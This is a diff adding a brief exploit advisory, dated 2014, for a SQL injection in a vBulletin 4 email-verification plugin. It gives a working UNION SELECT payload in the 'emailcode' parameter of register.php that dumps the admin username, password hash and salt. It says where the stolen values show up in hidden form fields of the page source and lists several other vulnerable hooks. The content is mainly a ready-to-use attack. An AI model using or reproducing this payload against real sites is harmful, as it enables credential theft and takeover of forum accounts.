@@ -1,0 +1,31 @@
+#Title: vBulletin Verify Email Before Registration Plugin - SQL Injection
+#Date: September 19 2014
+#Version: Any vBulletin 4.*.* version which has the plugin installed.
+#Plugin: http://www.vbulletin.org/forum/showthread.php?t=294164
+#Author: Dave (FW/FG)
+
+The vulnerability resides in the register_form_complete hook, and some 
+other hooks.
+The POST/GET data is not sanitized before being used in queries.
+
+SQL injection at:
+http://example.com/register.php?so=1&emailcode=[sqli]
+
+PoC:
+http://example.com/register.php?so=1&emailcode=1' UNION SELECT null, 
+concat(username,0x3a,password,0x3a,salt), null, null, null, null FROM 
+user WHERE userid = '1
+
+Now look at the source of the page and find:
+<input type="text" style="display: none" name="email" id="email" 
+maxlength="50" value="[DATA IS HERE]" dir="ltr" tabindex="1">
+<input type="text" style="display: none" name="emailconfirm" id="email" 
+maxlength="50" value="[DATA IS HERE]" dir="ltr" tabindex="1">
+
+Vulnerable hooks:
+profile_updatepassword_complete (Email field when you want to change 
+your email address after being logged in.)
+register_addmember_complete (After submitting the final registration form.)
+register_addmember_process
+register_form_complete (This example)
+register_start (Email confirmation form at register.php)
